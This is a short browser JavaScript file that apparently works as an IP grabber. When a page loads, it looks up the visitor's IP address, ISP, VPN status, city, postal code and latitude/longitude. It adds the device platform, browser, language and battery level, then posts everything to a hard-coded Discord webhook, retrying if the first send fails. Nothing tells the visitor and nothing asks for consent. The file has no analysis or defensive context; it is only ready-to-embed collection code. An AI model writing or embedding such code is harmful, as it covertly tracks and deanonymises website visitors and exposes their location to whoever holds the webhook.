async function sendUserDataToDiscord() {
  const webhookUrl = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-';
  
  try {
    const geoResponse = await fetch('https://json.geoiplookup.io');
    const geoData = await geoResponse.json();

    const vpnResponse = await fetch('https://vpn.geoiplookup.io/');
    const vpnData = await vpnResponse.json();

    const battery = navigator.getBattery ? await navigator.getBattery() : null;
    const userData = {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      language: navigator.language,
      batteryLevel: battery ? battery.level * 100 : 'N/A',
    };

    const messageContent = `
      **User Data:**
      - IP Address: ${geoData.ip}
      - ISP: ${geoData.isp}
      - Bad IP: ${vpnData.badip}
      - Hostname: ${geoData.hostname}
      - Country: ${geoData.country_name}
      - Country Code: ${geoData.country_code}
      - Continent Code: ${geoData.continent_code}
      - Continent Name: ${geoData.continent_name}
      - Region: ${geoData.region}
      - District: ${geoData.district}
      - City: ${geoData.city}
      - Postal Code: ${geoData.postal_code}
      - Latitude: ${geoData.latitude}
      - Longitude: ${geoData.longitude}
      - Timezone: ${geoData.timezone_name}
      - Connection Type: ${geoData.connection_type}
      - ASN Number: ${geoData.asn_number}
      - ASN Organization: ${geoData.asn_org}
      - ASN: ${geoData.asn}
      - Currency Code: ${geoData.currency_code}
      - Currency Name: ${geoData.currency_name}
      - Device: ${userData.platform}
      - Browser: ${userData.userAgent}
      - Language: ${userData.language}
      - Battery Level: ${userData.batteryLevel}%
    `;

    const payload = { content: messageContent };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error('Fail');
    }

    console.log('Success');

  } catch (error) {
    console.error('Failed to send user data, sending error message.', error);

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'User error 001 ⚠️ Could not send' }),
    });

    try {
      const retryResponse = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (retryResponse.ok) {
        console.log('sent on retry.');
      } else {
        console.error('Retry failed.');
      }

    } catch (retryError) {
      console.error('Retry error:', retryError);
    }
  }
}

window.addEventListener('load', sendUserDataToDiscord);
